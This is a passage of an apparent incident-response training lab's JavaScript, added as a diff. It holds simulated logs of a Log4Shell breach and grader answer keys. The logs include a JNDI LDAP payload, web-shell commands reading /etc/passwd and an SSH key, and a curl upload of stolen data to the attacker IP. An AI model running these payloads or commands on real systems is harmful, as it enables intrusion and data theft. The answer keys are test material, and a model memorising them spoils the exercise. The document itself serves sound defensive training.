+    <!-- Restart the entire capstone from the beginning -->
+    <div style="text-align:center; margin-top:20px;">
+        <button class="btn btn-secondary" onclick="restartCapstone()" id="restartBtn" style="display:none;">
+            Restart Capstone
+        </button>
+    </div>
+
+</div><!-- /.container -->
+
+
+<script>
+/*
+ * Operation Blackout -- Full IR Capstone
+ * JavaScript state machine for 5 sequential stages.
+ *
+ * ARCHITECTURE:
+ *   STATE object tracks: per-stage pass/fail, per-stage score, cumulative totals.
+ *   Each gradeStageN() function scores that stage, updates STATE, updates the
+ *   progress rail, and unlocks the next stage if the pass threshold is met.
+ *   Mood-ring CSS classes ('correct' / 'incorrect') are applied to each graded
+ *   element -- the .lab.html extension auto-triggers the Dr. Hex mood-ring observer.
+ *   No observer script is added here; the observer is injected by the platform.
+ *
+ * PASS THRESHOLD: 80% per stage (rounded to nearest question/point).
+ *   Stage 1: 7 alert decisions (5 correct incident alerts + 2 correct FP exclusions).
+ *            Pass = 6 or more correct alert decisions.
+ *   Stage 2: 6 questions. Pass = 5 or more correct.
+ *   Stage 3: 16 action decisions (5 correct contain + 2 distractors + 4 correct erad
+ *            + 2 distractors + 3 correct recov + 2 distractors = 14 correct + 2 correct-exclusions = see below).
+ *            Simplified: count correct selections and correct non-selections of distractors.
+ *            Pass = 13 of 16 correct.
+ *   Stage 4: 1 root-cause (correct = rc2) + 6 controls (correct = H1-H6) + 2 distractors = 9 decisions.
+ *            Pass = 8 of 9 correct.
+ *   Stage 5: 4 risk treatments + 10 report statements = 14 decisions. Pass = 12 of 14 correct.
+ */
+
+/* ── Global state ── */
+var STATE = {
+    stages: {
+        1: { passed: false, score: 0, total: 0 },
+        2: { passed: false, score: 0, total: 0 },
+        3: { passed: false, score: 0, total: 0 },
+        4: { passed: false, score: 0, total: 0 },
+        5: { passed: false, score: 0, total: 0 }
+    },
+    currentStage: 1,
+    allComplete: false
+};
+
+/* ── Log data: 3 sources, each line tagged with a source key and a type ── */
+/*
+ * Types: 'normal' = routine, 'highlight' = suspicious/notable, 'attack' = confirmed attack artifact.
+ * The log lines are deliberately formatted to match real log formats:
+ *   - Apache Combined Log Format
+ *   - Linux sshd auth.log format
+ *   - Generic firewall EGRESS/INGRESS line format
+ *
+ * ALL incident-bible facts (IP, hosts, account, path, bytes) appear here verbatim.
+ */
+var LOG_LINES = [
+    /* Apache access log -- WEB-DMZ-01 (10.10.10.20) */
+    { src:'apache', type:'normal',    text:'10.10.1.50 - - [09/Mar/2026:06:00:14 +0000] "GET /health HTTP/1.1" 200 214 "-" "Nessus/10.7.2"' },
+    { src:'apache', type:'normal',    text:'10.10.1.50 - - [09/Mar/2026:06:01:03 +0000] "GET /login HTTP/1.1" 200 4812 "-" "Nessus/10.7.2"' },
+    { src:'apache', type:'normal',    text:'10.10.1.50 - - [09/Mar/2026:06:04:22 +0000] "OPTIONS / HTTP/1.1" 200 90 "-" "Nessus/10.7.2"' },
+    { src:'apache', type:'highlight', text:'203.0.113.66 - - [09/Mar/2026:07:14:32 +0000] "GET / HTTP/1.1" 200 8192 "-" "Mozilla/5.0 (compatible; recon)"' },
+    { src:'apache', type:'attack',    text:'203.0.113.66 - - [09/Mar/2026:07:31:04 +0000] "GET /app/api/status HTTP/1.1" 200 512 "-" "${jndi:ldap://203.0.113.66:1389/a}"' },
+    { src:'apache', type:'attack',    text:'203.0.113.66 - - [09/Mar/2026:07:31:09 +0000] "GET /app/api/status HTTP/1.1" 200 512 "-" "${jndi:ldap://203.0.113.66:1389/a}"' },
+    { src:'apache', type:'normal',    text:'10.10.5.3   - - [09/Mar/2026:07:32:00 +0000] "GET /dashboard HTTP/1.1" 200 14300 "-" "Mozilla/5.0"' },
+    { src:'apache', type:'attack',    text:'203.0.113.66 - - [09/Mar/2026:07:34:17 +0000] "GET /var/www/app/uploads/status.jsp?cmd=id HTTP/1.1" 200 31 "-" "curl/7.88.1"' },
+    { src:'apache', type:'attack',    text:'203.0.113.66 - - [09/Mar/2026:07:34:31 +0000] "GET /var/www/app/uploads/status.jsp?cmd=whoami HTTP/1.1" 200 23 "-" "curl/7.88.1"' },
+    { src:'apache', type:'attack',    text:'203.0.113.66 - - [09/Mar/2026:07:36:54 +0000] "GET /var/www/app/uploads/status.jsp?cmd=cat+/etc/passwd HTTP/1.1" 200 1802 "-" "curl/7.88.1"' },
+    { src:'apache', type:'attack',    text:'203.0.113.66 - - [09/Mar/2026:07:44:07 +0000] "GET /var/www/app/uploads/status.jsp?cmd=cat+/home/svc-deploy/.ssh/id_rsa HTTP/1.1" 200 3247 "-" "curl/7.88.1"' },
+    /* Auth log -- APP-INT-05 (10.10.20.15) receiving the lateral SSH */
+    { src:'auth', type:'normal',    text:'Mar  9 07:00:01 APP-INT-05 sshd[1423]: Server listening on 0.0.0.0 port 22.' },
+    { src:'auth', type:'normal',    text:'Mar  9 07:12:17 APP-INT-05 sshd[2271]: Invalid user jenkins from 10.10.5.30 port 48210' },
+    { src:'auth', type:'normal',    text:'Mar  9 07:12:18 APP-INT-05 sshd[2271]: Connection closed by invalid user jenkins 10.10.5.30 port 48210 [preauth]' },
+    { src:'auth', type:'attack',    text:'Mar  9 07:47:09 APP-INT-05 sshd[3301]: Accepted publickey for svc-deploy from 10.10.10.20 port 52411 ssh2: RSA SHA256:r3dT34mP4t1entz3r0K3y' },
+    { src:'auth', type:'attack',    text:'Mar  9 07:47:09 APP-INT-05 sshd[3301]: pam_unix(sshd:session): session opened for user svc-deploy by (uid=0)' },
+    { src:'auth', type:'attack',    text:'Mar  9 07:47:15 APP-INT-05 sudo[3389]:  svc-deploy : TTY=pts/0 ; PWD=/home/svc-deploy ; USER=root ; COMMAND=/usr/bin/find /opt/appdata -name "*.db" -exec tar -czf /tmp/exfil.tar.gz {} +' },
+    { src:'auth', type:'attack',    text:'Mar  9 08:01:02 APP-INT-05 sudo[3401]:  svc-deploy : TTY=pts/0 ; PWD=/home/svc-deploy ; USER=root ; COMMAND=/usr/bin/curl -s -T /tmp/exfil.tar.gz https://203.0.113.66/' },
+    { src:'auth', type:'normal',    text:'Mar  9 09:00:01 APP-INT-05 CRON[4120]: (root) CMD (/usr/bin/find /var/log -mtime +30 -delete)' },
+    /* Firewall log -- egress events for both WEB-DMZ-01 and APP-INT-05 */
+    { src:'fw', type:'normal',    text:'2026-03-09T06:00:00Z FW-PERIMETER EGRESS ALLOW  SRC=10.10.30.10 DST=10.10.99.5   PROTO=TCP DPORT=445  BYTES=3758096384 RULE=BACKUP-INTERNAL' },
+    { src:'fw', type:'highlight', text:'2026-03-09T07:31:07Z FW-PERIMETER EGRESS ALERT  SRC=10.10.10.20 DST=203.0.113.66 PROTO=TCP DPORT=1389 BYTES=312         RULE=EGRESS-UNKNOWN-EXT [LDAP OUTBOUND -- ANOMALOUS]' },
+    { src:'fw', type:'attack',    text:'2026-03-09T08:02:44Z FW-PERIMETER EGRESS ALLOW  SRC=10.10.20.15 DST=203.0.113.66 PROTO=TCP DPORT=443  BYTES=4509715660  RULE=HTTPS-OUTBOUND-PERMIT [ANOMALOUS VOLUME]' },
+    { src:'fw', type:'normal',    text:'2026-03-09T09:15:00Z FW-PERIMETER EGRESS ALLOW  SRC=10.10.10.20 DST=10.10.99.5   PROTO=TCP DPORT=445  BYTES=204800       RULE=BACKUP-INTERNAL' }
+];
+
+/* Track the current active log filter so re-grading doesn't break the view */
+var activeFilter = 'all';
+
+/* ── Render log lines into the log body element on page load ── */
+function renderLogs() {
+    var container = document.getElementById('logBody');
+    if (!container) { return; }
+    container.innerHTML = '';
+    LOG_LINES.forEach(function(line) {
+        var span = document.createElement('span');
+        span.className = 'log-line ' + line.type + ' log-src-' + line.src;
+        /* Apply hidden class immediately if filter is active */
+        if (activeFilter !== 'all' && line.src !== activeFilter) {
+            span.classList.add('hidden');
+        }
+        /* Use textContent -- never innerHTML for log data (XSS safety) */
+        span.textContent = line.text;
+        container.appendChild(span);
+        container.appendChild(document.createTextNode('\n'));
+    });
+}
+
+/* ── Filter the log viewer by source tag ── */
+function filterLogs(src) {
+    activeFilter = src;
+    /* Update aria-pressed states on filter buttons */
+    ['all','apache','auth','fw'].forEach(function(key) {
+        var btn = document.getElementById('flt-' + key);
+        if (btn) {
+            btn.setAttribute('aria-pressed', key === src ? 'true' : 'false');
+            if (key === src) { btn.classList.add('active'); }
+            else { btn.classList.remove('active'); }
+        }
+    });
+    /* Show/hide lines */
+    var lines = document.querySelectorAll('.log-line');
+    lines.forEach(function(el) {
+        if (src === 'all' || el.classList.contains('log-src-' + src)) {
+            el.classList.remove('hidden');
+        } else {
+            el.classList.add('hidden');
+        }
+    });
+}
+
+/* ── Update the progress rail (5-stop nav) ── */
+function updateRail(stageNum, status) {
+    /* status: 'active' | 'passed' | 'locked' */
+    var el = document.getElementById('rail-' + stageNum);
+    if (!el) { return; }
+    el.classList.remove('active','passed','locked');
+    el.classList.add(status);
+}
+
+/* ── Update the cumulative score display ── */
+function updateCumulativeScore() {
+    var totalScore = 0;
+    var totalPossible = 0;
+    /* Sum only stages that have been graded (total > 0) */
+    [1,2,3,4,5].forEach(function(n) {
+        if (STATE.stages[n].total > 0) {
+            totalScore    += STATE.stages[n].score;
+            totalPossible += STATE.stages[n].total;
+        }
+    });
+    var display = document.getElementById('cumulativeDisplay');
+    if (!display) { return; }
+    if (totalPossible === 0) {
+        display.textContent = '-- / --';
+    } else {
+        var pct = Math.round((totalScore / totalPossible) * 100);
+        display.textContent = totalScore + ' / ' + totalPossible + ' (' + pct + '%)';
+    }
+}
+
+/* ── Unlock and display the next stage after a pass ── */
+function unlockStage(stageNum) {
+    /* Update previous stage rail to 'passed' */
+    updateRail(stageNum - 1, 'passed');
+    /* Update new stage rail to 'active' */
+    updateRail(stageNum, 'active');
+
+    /* Hide the locked message and show the content for the new stage */
+    var lockedEl = document.getElementById('s' + stageNum + '-locked');
+    var contentEl = document.getElementById('s' + stageNum + '-content');
+    if (lockedEl)  { lockedEl.style.display  = 'none'; }
+    if (contentEl) { contentEl.style.display  = 'block'; }
+
+    /* Render logs when stage 2 unlocks (log viewer needs to be populated) */
+    if (stageNum === 2) {
+        renderLogs();
+    }
+
+    /* Scroll the new stage into view */
+    var stageEl = document.getElementById('stage-' + stageNum);
+    if (stageEl) {
+        stageEl.scrollIntoView({ behavior: 'smooth', block: 'start' });
+        /* Move focus to the stage heading for keyboard accessibility */
+        var heading = stageEl.querySelector('h2');
+        if (heading) {
+            heading.setAttribute('tabindex', '-1');
+            heading.focus();
+        }
+    }
+
+    STATE.currentStage = stageNum;
+}
+
+/* ── Show the final report card once all 5 stages are passed ── */
+function showReportCard() {
+    STATE.allComplete = true;
+    updateRail(5, 'passed');
+
+    /* Build per-stage cells */
+    var stageNames = ['','Detect','Investigate','Respond','Remediate','Report'];
+    var html = '';
+    var grandScore = 0;
+    var grandTotal = 0;
+    [1,2,3,4,5].forEach(function(n) {
+        var s = STATE.stages[n];
+        var pct = s.total > 0 ? Math.round((s.score / s.total) * 100) : 0;
+        var passClass = pct >= 80 ? 'pass' : 'fail';
+        grandScore += s.score;
+        grandTotal += s.total;
+        html += '<div class="rc-cell ' + passClass + '">' +
+            '<div class="rc-stage-name">Stage ' + n + ' -- ' + stageNames[n] + '</div>' +
+            '<div class="rc-score">' + s.score + '/' + s.total + '</div>' +
+            '<div class="rc-pct">' + pct + '%</div>' +
+            '</div>';
+    });
+    document.getElementById('rcGrid').innerHTML = html;
+
+    /* Compute overall grade */
+    var overall = grandTotal > 0 ? Math.round((grandScore / grandTotal) * 100) : 0;
+    var gradeEl = document.getElementById('overallGrade');
+    var labelEl = document.getElementById('overallLabel');
+    var grade, gradeClass, label;
+    if (overall >= 93)      { grade = 'A'; gradeClass = 'grade-A'; label = 'Exceptional -- Top-tier Incident Commander.'; }
+    else if (overall >= 83) { grade = 'B'; gradeClass = 'grade-B'; label = 'Strong -- Solid operational IR discipline.'; }
+    else if (overall >= 73) { grade = 'C'; gradeClass = 'grade-C'; label = 'Passing -- Review the stages where you struggled.'; }
+    else if (overall >= 63) { grade = 'D'; gradeClass = 'grade-D'; label = 'Borderline -- Revisit NIST 800-61 and Log4Shell mechanics.'; }
+    else                    { grade = 'F'; gradeClass = 'grade-F'; label = 'Did not meet standard -- Complete the individual labs and retry.'; }
+
+    gradeEl.textContent = grade + ' (' + overall + '%)';
+    gradeEl.className = 'overall-grade ' + gradeClass;
+    labelEl.textContent = label;
+
+    /* Show report card + restart button */
+    document.getElementById('reportCard').classList.add('show');
+    document.getElementById('restartBtn').style.display = 'inline-flex';
+
+    /* Scroll to report card */
+    document.getElementById('reportCard').scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+/* ════════════════════════════════════════════════════════════════
+   STAGE 1 GRADER -- SIEM Alert Triage
+   Correct incident alerts: A1, A2, A4, A5, A7 (5 alerts).
+   Correct non-selections (false positives): A3, A6 (2 alerts).
+   Total decisions: 7. Pass threshold: 6 of 7 (86%) i.e. >= 6 correct.
+════════════════════════════════════════════════════════════════ */
+function gradeStage1() {
+    /*
+     * For each alert: a correct decision is either:
+     *   (a) IS an incident alert AND IS checked, or
+     *   (b) IS a false-positive AND IS NOT checked.
+     * Explanations follow the incident bible exactly.
+     */
+    var ALERTS = {
+        A1: {
+            incident: true,
+            explainOk:  'Correct -- this TCP port scan from 203.0.113.66 to WEB-DMZ-01 is kill-chain Step 1: Reconnaissance. Include it.',
+            explainBad: 'Miss -- this port scan from 203.0.113.66 to WEB-DMZ-01 IS part of the incident (kill-chain Step 1: Recon). Mark it.'
+        },
+        A2: {
+            incident: true,
+            explainOk:  'Correct -- the Log4Shell (CVE-2021-44228) JNDI exploit is the ROOT CAUSE event. Kill-chain Step 2. Critical to include.',
+            explainBad: 'Miss -- this is the core exploit (Log4Shell / CVE-2021-44228). It is the entry point. Must be included.'
+        },
+        A3: {
+            incident: false,
+            explainOk:  'Correct exclusion -- source is 10.10.1.50 (internal authorized scanner), NOT 203.0.113.66. This matches an approved change window. False positive.',
+            explainBad: 'False positive selected -- source 10.10.1.50 is an authorized internal vulnerability scanner under change CR-2026-0308. Do not confuse with attacker traffic.'
+        },
+        A4: {
+            incident: true,
+            explainOk:  'Correct -- the web shell execution at /var/www/app/uploads/status.jsp via ?cmd= is kill-chain Step 3: Foothold. Must be included.',
+            explainBad: 'Miss -- web shell activity on /var/www/app/uploads/status.jsp IS the attacker executing commands on WEB-DMZ-01 (kill-chain Step 3).'
+        },
+        A5: {
+            incident: true,
+            explainOk:  'Correct -- svc-deploy SSH from WEB-DMZ-01 to APP-INT-05 is kill-chain Step 4: Lateral Movement. Include it.',
+            explainBad: 'Miss -- the anomalous svc-deploy SSH from WEB-DMZ-01 (10.10.10.20) to APP-INT-05 (10.10.20.15) IS the lateral movement. Must be included.'
+        },
+        A6: {
+            incident: false,
+            explainOk:  'Correct exclusion -- this is a scheduled internal backup (10.10.30.10 to 10.10.99.5, both internal IPs). No external routing. Matches BKP-2026-NIGHTLY-FS01. False positive.',
+            explainBad: 'False positive selected -- this 3.8 GB transfer is an approved INTERNAL backup job. Both endpoints are internal. The 4.2 GB exfil (Alert A7) is the real threat.'
+        },
+        A7: {
+            incident: true,
+            explainOk:  'Correct -- 4,509,715,660 bytes (~4.2 GB) from APP-INT-05 to 203.0.113.66 is kill-chain Step 5: Exfiltration. Critical to include.',
+            explainBad: 'Miss -- BYTES=4,509,715,660 (~4.2 GB) outbound from APP-INT-05 to the attacker IP 203.0.113.66 IS the exfiltration event. This must be included.'
+        }
+    };
+
+    var correct = 0;
+    var total = Object.keys(ALERTS).length; /* 7 */
+
+    Object.keys(ALERTS).forEach(function(id) {
+        var info     = ALERTS[id];
+        var chkEl    = document.getElementById('chk-' + id);
+        var cardEl   = document.getElementById('ac-' + id);
+        var fbEl     = document.getElementById('fb-' + id);
+        var checked  = chkEl ? chkEl.checked : false;
+        /* A correct decision: incident alert that was checked, OR false-pos that was NOT checked */
+        var decision = (info.incident && checked) || (!info.incident && !checked);
+
+        if (decision) {
+            correct++;
+            /* Apply mood-ring 'correct' class to the card */
+            if (cardEl) { cardEl.classList.add('correct'); cardEl.classList.remove('incorrect'); }
+            if (fbEl)   { fbEl.textContent = info.explainOk; fbEl.className = 'alert-feedback show ok'; }
+        } else {
+            /* Apply mood-ring 'incorrect' class to the card */
+            if (cardEl) { cardEl.classList.add('incorrect'); cardEl.classList.remove('correct'); }
+            if (fbEl)   { fbEl.textContent = info.explainBad; fbEl.className = 'alert-feedback show bad'; }
+        }
+
+        /* Disable checkbox after grading */
+        if (chkEl) { chkEl.disabled = true; }
+    });
+
+    STATE.stages[1].score = correct;
+    STATE.stages[1].total = total;
+    updateCumulativeScore();
+
+    var pct    = Math.round((correct / total) * 100);
+    var passed = correct >= 6; /* 6/7 = 86% >= 80% */
+    STATE.stages[1].passed = passed;
+
+    /* Show the stage result banner */
+    showStageResult(1, correct, total, pct, passed,
+        passed
+            ? 'You correctly identified the incident alerts and excluded the authorized activity. Stage 2 unlocked -- move to Log Forensics.'
+            : 'You need to correctly identify at least 6 of 7 alert decisions (include all 5 incident alerts; exclude both false positives). Reset and review the source IPs and event context.'
+    );
+
+    /* Disable the submit button */
+    var submitBtn = document.getElementById('s1-submit');
+    if (submitBtn) { submitBtn.disabled = true; }
+
+    /* Unlock Stage 2 if passed */
+    if (passed) {
+        unlockStage(2);
+    }
+}
+
+/* ════════════════════════════════════════════════════════════════
+   STAGE 2 GRADER -- Log Forensics
+   6 questions. Correct answers:
+     Q1 = b (Log4Shell JNDI)
+     Q2 = c (203.0.113.66)
+     Q3 = b (/var/www/app/uploads/status.jsp)
+     Q4 = c (svc-deploy)
+     Q5 = c (APP-INT-05 / 10.10.20.15)
+     Q6 = b (4,509,715,660 bytes / ~4.2 GB)
+   Pass threshold: 5 of 6 (83%).
+════════════════════════════════════════════════════════════════ */
+function gradeStage2() {
+    var QUESTIONS = [
+        {
+            id: 'q2-1', correct: 'b',
+            explainOk:  'Correct -- the Apache log shows ${jndi:ldap://203.0.113.66:1389/a} in the User-Agent field at 07:31:04. This is the Log4Shell (CVE-2021-44228) JNDI LDAP injection triggering RCE.',
+            explainBad: 'Incorrect -- the Apache log at 07:31:04 shows a JNDI lookup string in the User-Agent header: ${jndi:ldap://203.0.113.66:1389/a}. This is Log4Shell (CVE-2021-44228).'
+        },
+        {
+            id: 'q2-2', correct: 'c',
+            explainOk:  'Correct -- 203.0.113.66 appears in the Apache log (JNDI + web shell requests), the firewall log (LDAP outbound + exfil), and is the destination of the curl exfil in the auth log. One consistent attacker IP.',
+            explainBad: 'Incorrect -- 203.0.113.66 is the attacker IP. It appears in all three log sources: Apache access log (exploit + web shell), firewall (outbound LDAP + exfil), and auth log (curl destination).'
+        },
+        {
+            id: 'q2-3', correct: 'b',
+            explainOk:  'Correct -- the Apache log shows GET /var/www/app/uploads/status.jsp?cmd=id at 07:34:17, followed by additional ?cmd= requests. This is the web shell path.',
+            explainBad: 'Incorrect -- the Apache log at 07:34:17 shows GET requests to /var/www/app/uploads/status.jsp?cmd=id (and other commands). That is the web shell path.'
+        },
+        {
+            id: 'q2-4', correct: 'c',
+            explainOk:  'Correct -- the auth log on APP-INT-05 at 07:47:09 shows: "Accepted publickey for svc-deploy from 10.10.10.20". svc-deploy is the compromised account used for lateral movement.',
+            explainBad: 'Incorrect -- the auth log on APP-INT-05 at 07:47:09 shows the SSH session was accepted for user "svc-deploy" from 10.10.10.20 (WEB-DMZ-01). That is the compromised lateral-movement account.'
+        },
+        {
+            id: 'q2-5', correct: 'c',
+            explainOk:  'Correct -- APP-INT-05 (10.10.20.15) is the destination. The auth log shows svc-deploy logging in from 10.10.10.20 to APP-INT-05 at 07:47:09. The firewall exfil line also confirms 10.10.20.15 as the source of the outbound transfer.',
+            explainBad: 'Incorrect -- the auth log sshd entry for APP-INT-05 (10.10.20.15) received the SSH session for svc-deploy. The firewall log also confirms the 4.2 GB exfil originated from 10.10.20.15.'
+        },
+        {
+            id: 'q2-6', correct: 'b',
+            explainOk:  'Correct -- the firewall log line at 08:02:44 shows: SRC=10.10.20.15 DST=203.0.113.66 BYTES=4509715660. That is ~4.2 GB, consistent with a large customer PII archive being exfiltrated.',
+            explainBad: 'Incorrect -- the firewall EGRESS line at 08:02:44 shows BYTES=4509715660 (~4.2 GB) from 10.10.20.15 to 203.0.113.66. The 3,758,096,384-byte entry is the internal backup (different source/dest, earlier time).'
+        }
+    ];
+
+    var correct = 0;
+    var total = QUESTIONS.length;
+
+    QUESTIONS.forEach(function(q) {
+        var selEl  = document.getElementById(q.id + '-sel');
+        var qEl    = document.getElementById(q.id);
+        var fbEl   = document.getElementById('fb-' + q.id);
+        var val    = selEl ? selEl.value : '';
+        var isOk   = (val === q.correct);
+
+        if (isOk) {
+            correct++;
+            /* Mood-ring class on the q-block */
+            if (qEl)  { qEl.classList.add('correct'); qEl.classList.remove('incorrect'); }
+            if (fbEl) { fbEl.textContent = q.explainOk; fbEl.className = 'q-feedback show ok'; }
+        } else {
+            if (qEl)  { qEl.classList.add('incorrect'); qEl.classList.remove('correct'); }
+            if (fbEl) { fbEl.textContent = q.explainBad; fbEl.className = 'q-feedback show bad'; }
+        }
+
+        if (selEl) { selEl.disabled = true; }
+    });
+
+    STATE.stages[2].score = correct;
+    STATE.stages[2].total = total;
+    updateCumulativeScore();
+
+    var pct    = Math.round((correct / total) * 100);
+    var passed = correct >= 5; /* 5/6 = 83% >= 80% */
+    STATE.stages[2].passed = passed;
+
+    showStageResult(2, correct, total, pct, passed,
+        passed
+            ? 'Strong log analysis. You traced the full attack chain through the Apache, auth, and firewall logs. Stage 3 unlocked -- move to the IR Playbook.'
+            : 'You need 5 of 6 correct. Review the log entries above carefully -- every answer is explicitly in the logs. Use the filter buttons to isolate each log source. Reset and retry.'
+    );
+
+    var submitBtn = document.getElementById('s2-submit');
+    if (submitBtn) { submitBtn.disabled = true; }
+
+    if (passed) {
+        unlockStage(3);
+    }
+}
+
+/* ════════════════════════════════════════════════════════════════
+   STAGE 3 GRADER -- IR Playbook (Containment / Eradication / Recovery)
+   Decision structure:
+     CONTAINMENT correct = C1, C2, C3, C4, C5 (check these)
+     CONTAINMENT distractors = C6 (belongs in Erad), C7 (belongs in Recov)
+     ERADICATION correct = E1, E2, E3, E4 (check these)
+     ERADICATION distractors = E5 (belongs in Contain), E6 (belongs in Recov)
+     RECOVERY correct = R1, R2, R3 (check these)
+     RECOVERY distractors = R4 (belongs in Erad), R5 (not applicable)
+   Total decisions: 16 (should-be-checked + should-not-be-checked).
+   Pass threshold: 13 of 16 (81%).
+════════════════════════════════════════════════════════════════ */
+function gradeStage3() {
+    /*
+     * Each entry: id = action checkbox id, correct = true if should be checked,
+     * explains are for the feedback line on the action item.
+     */
+    var ACTIONS = [
+        /* CONTAINMENT -- correct selections */
+        { id:'C1', elem:'ai-C1', fb:'fb-C1', correct:true,
+          explainOk:  'Correct -- isolating WEB-DMZ-01 is the first containment step. Network isolation stops active exploitation while preserving the host for forensics.',
+          explainBad: 'Missed -- isolating WEB-DMZ-01 (10.10.10.20) is mandatory Containment. The attacker has an active web shell on this host.' },
+        { id:'C2', elem:'ai-C2', fb:'fb-C2', correct:true,
+          explainOk:  'Correct -- APP-INT-05 is actively exfiltrating data. Isolating it stops the outbound transfer.',
+          explainBad: 'Missed -- APP-INT-05 (10.10.20.15) is the exfil source. It must be isolated immediately as part of Containment.' },
+        { id:'C3', elem:'ai-C3', fb:'fb-C3', correct:true,
+          explainOk:  'Correct -- disabling svc-deploy prevents re-use of the stolen credential for further lateral movement.',
+          explainBad: 'Missed -- the svc-deploy account is compromised. Disabling it in AD is a required Containment action.' },
+        { id:'C4', elem:'ai-C4', fb:'fb-C4', correct:true,
+          explainOk:  'Correct -- blocking 203.0.113.66 at the perimeter prevents any new C2 connections from the attacker IP.',
+          explainBad: 'Missed -- blocking the attacker IP 203.0.113.66 at the perimeter is a Containment action. It cuts active C2.' },
+        { id:'C5', elem:'ai-C5', fb:'fb-C5', correct:true,
+          explainOk:  'Correct -- and CRITICAL. Evidence must be preserved BEFORE any destructive steps. This is NIST 800-61 / SY0-701 exam rule.',
+          explainBad: 'Missed -- evidence preservation (memory + disk images) MUST happen during Containment, before Eradication. This is an NIST 800-61 requirement.' },
+        /* CONTAINMENT -- distractors (wrong phase) */
+        { id:'C6', elem:'ai-C6', fb:'fb-C6', correct:false,
+          explainOk:  'Correct exclusion -- deleting the web shell is Eradication, not Containment. Doing it before forensic imaging would destroy evidence.',
+          explainBad: 'Incorrect phase -- deleting /var/www/app/uploads/status.jsp belongs in Eradication, NOT Containment. Doing this first destroys forensic evidence.' },
+        { id:'C7', elem:'ai-C7', fb:'fb-C7', correct:false,
+          explainOk:  'Correct exclusion -- restoring from backup is Recovery (Phase 3), not Containment. Containment focuses on stopping the bleed.',
+          explainBad: 'Incorrect phase -- restoring from backup is Recovery (Phase 3), not Containment. Phase order is Containment -> Eradication -> Recovery.' },
+        /* ERADICATION -- correct selections */
+        { id:'E1', elem:'ai-E1', fb:'fb-E1', correct:true,
+          explainOk:  'Correct -- removing the web shell is Eradication. Note: forensic imaging must be done first (completed in Containment).',
+          explainBad: 'Missed -- removing /var/www/app/uploads/status.jsp is a required Eradication step after forensic imaging is complete.' },
+        { id:'E2', elem:'ai-E2', fb:'fb-E2', correct:true,
+          explainOk:  'Correct -- patching Log4j (CVE-2021-44228) is the primary Eradication action because Log4Shell is the root cause.',
+          explainBad: 'Missed -- upgrading Log4j to 2.17.1+ is the core eradication of CVE-2021-44228, the root cause vulnerability.' },
+        { id:'E3', elem:'ai-E3', fb:'fb-E3', correct:true,
+          explainOk:  'Correct -- resetting svc-deploy credentials ensures the harvested key cannot be reused. An audit of other svc-deploy sessions is also required.',
+          explainBad: 'Missed -- resetting svc-deploy credentials and auditing its prior sessions is a required Eradication step.' },
+        { id:'E4', elem:'ai-E4', fb:'fb-E4', correct:true,
+          explainOk:  'Correct -- hunting and removing all persistence mechanisms ensures the attacker has no re-entry point after systems are restored.',
+          explainBad: 'Missed -- removing attacker persistence (cron jobs, authorized_keys, additional shells) is required before Recovery begins.' },
+        /* ERADICATION -- distractors (wrong phase) */
+        { id:'E5', elem:'ai-E5', fb:'fb-E5', correct:false,
+          explainOk:  'Correct exclusion -- blocking the attacker IP is Containment (Phase 1), not Eradication. It should already be done.',
+          explainBad: 'Incorrect phase -- blocking 203.0.113.66 belongs in Containment (Phase 1). By Eradication it should already be in place.' },
+        { id:'E6', elem:'ai-E6', fb:'fb-E6', correct:false,
+          explainOk:  'Correct exclusion -- returning APP-INT-05 to production is Recovery (Phase 3), not Eradication.',
+          explainBad: 'Incorrect phase -- returning APP-INT-05 to production is Recovery, not Eradication. Eradication removes threats; Recovery restores services.' },
+        /* RECOVERY -- correct selections */
+        { id:'R1', elem:'ai-R1', fb:'fb-R1', correct:true,
+          explainOk:  'Correct -- restoring from a pre-incident clean backup is the Recovery step after eradication is verified.',
+          explainBad: 'Missed -- restoring WEB-DMZ-01 and APP-INT-05 from verified pre-incident backups is the core Recovery action.' },
+        { id:'R2', elem:'ai-R2', fb:'fb-R2', correct:true,
+          explainOk:  'Correct -- validation before reconnection is mandatory. Verify Log4j patch, web shell removal, and svc-deploy scope before returning to production.',
+          explainBad: 'Missed -- validating the patch, shell removal, and least-privilege state before reconnecting hosts is required Recovery procedure.' },
+        { id:'R3', elem:'ai-R3', fb:'fb-R3', correct:true,
+          explainOk:  'Correct -- enhanced monitoring for 72 hours post-restoration is standard practice (NIST 800-61 Phase 4 feeds back here).',
+          explainBad: 'Missed -- monitoring restored hosts with enhanced SIEM/EDR coverage post-restoration is a required Recovery step.' },
+        /* RECOVERY -- distractors */
+        { id:'R4', elem:'ai-R4', fb:'fb-R4', correct:false,
+          explainOk:  'Correct exclusion -- a full org-wide Log4j audit is valuable but belongs in Eradication, not Recovery.',
+          explainBad: 'Incorrect phase -- org-wide Log4j scanning belongs in Eradication. Recovery focuses on restoring and validating the affected systems.' },
+        { id:'R5', elem:'ai-R5', fb:'fb-R5', correct:false,
+          explainOk:  'Correct exclusion -- a company-wide password reset is not a required Recovery action for this incident. The root cause is Log4Shell (a software vulnerability), not a credential compromise at the password level.',
+          explainBad: 'Incorrect inclusion -- a company-wide password reset does not address the root cause (Log4Shell) and is not a required Recovery step for this incident.' }
+    ];
+
+    var correct = 0;
+    var total   = ACTIONS.length; /* 18 */
+
+    ACTIONS.forEach(function(a) {
+        var chkEl  = document.getElementById('ac-' + a.id);
+        var itemEl = document.getElementById(a.elem);
+        var fbEl   = document.getElementById(a.fb);
+        var checked = chkEl ? chkEl.checked : false;
+        var decision = (a.correct && checked) || (!a.correct && !checked);
+
+        if (decision) {
+            correct++;
+            if (itemEl) { itemEl.classList.add('correct'); itemEl.classList.remove('incorrect'); }
+            if (fbEl)   { fbEl.textContent = a.explainOk; fbEl.className = 'action-fb show ok'; }
+        } else {
+            if (itemEl) { itemEl.classList.add('incorrect'); itemEl.classList.remove('correct'); }
+            if (fbEl)   { fbEl.textContent = a.explainBad; fbEl.className = 'action-fb show bad'; }
+        }
+
+        if (chkEl) { chkEl.disabled = true; }
+    });
+
+    STATE.stages[3].score = correct;
+    STATE.stages[3].total = total;
+    updateCumulativeScore();
+
+    var pct    = Math.round((correct / total) * 100);
+    var passed = correct >= 15; /* 15/18 = 83% >= 80% */
+    STATE.stages[3].passed = passed;
+
+    showStageResult(3, correct, total, pct, passed,
+        passed
+            ? 'Solid IR phase discipline. You correctly sequenced Containment -> Eradication -> Recovery and placed each action in its correct phase. Stage 4 unlocked.'
+            : 'Review the NIST 800-61 phase definitions. Key rules: evidence preservation happens in Containment before any destructive steps; restoring systems is Recovery not Eradication. Reset and retry.'
+    );
+
